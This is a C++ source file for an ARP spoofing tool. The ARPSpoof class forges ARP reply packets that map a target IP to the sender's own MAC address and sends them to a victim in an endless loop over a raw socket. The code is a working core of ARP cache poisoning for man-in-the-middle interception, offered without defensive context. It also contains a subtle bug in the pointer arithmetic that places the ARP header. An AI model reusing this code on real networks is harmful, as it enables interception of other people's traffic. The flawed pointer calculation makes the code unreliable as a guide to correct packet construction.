#include <cstring>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <thread>

#include "arp_spoof.h"
#include "ethernet.h"
#include "arp.h"
#include "../utils/mac.h"

ARPSpoof::ARPSpoof(Socket *socket) {
  this->socket = socket;
  memset(this->buffer, 0, BUFFER_SIZE);
}

void ARPSpoof::makeSpoofData() {
  unsigned char *myMacAddress = getMyMacAddress();
  EthernetHeader *ethernetHeader = (EthernetHeader*)this->buffer;
  setEthernetHeader(ethernetHeader, this->targetMacAddress, myMacAddress, ETH_P_ARP);
  ARPHeader *arpHeader = (ARPHeader*)this->buffer + sizeof(EthernetHeader);
  setARPHeader(arpHeader, ETH_P_ARP, ETH_P_IP, MAC_LENGTH, IPV4_LENGTH, ARP_REPLY, myMacAddress, this->destinationIPAddress, this->targetMacAddress, this->targetIPAddress);
}

void ARPSpoof::spoof(sockaddr *to, int duration) {
  this->makeSpoofData();

  while(true) {
    this->socket->sendTo(to, this->buffer, BUFFER_SIZE);
    std::this_thread::sleep_for(std::chrono::minutes(duration));
  }
}